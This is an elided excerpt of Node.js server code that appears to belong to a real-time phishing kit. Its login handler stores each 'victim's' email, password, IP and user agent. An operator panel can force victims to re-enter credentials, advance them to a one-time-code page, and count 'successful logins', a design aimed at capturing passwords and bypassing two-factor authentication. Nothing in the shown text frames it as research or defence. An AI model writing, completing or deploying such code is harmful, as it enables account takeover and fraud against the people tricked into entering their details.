...
function getSessionHeader(v) {
  if (v.page === 'success' || v.status === 'approved') return `✅ Login approved`;
...
app.post('/api/login', async (req, res) => {
  try {
    ...
    auditLog.push({ t: Date.now(), victimN: v.victimNum, sid, email, password, otp: '', ip: v.ip, ua: v.ua });
    res.sendStatus(200);
  } catch (err) {
...
app.post('/api/panel', async (req, res) => {
  ...
  switch (action) {
    case 'redo':
      v.status = 'redo';
      if (v.page === 'index.html') {
        v.entered = false; v.email = ''; v.password = '';
      } else if (v.page === 'verify.html') {
        v.otp = '';
      }
      break;
    case 'cont':
      ...
      else if (v.page === 'verify.html') { v.page = 'success'; v.status = 'approved'; successfulLogins++; }
      break;
    case 'delete':
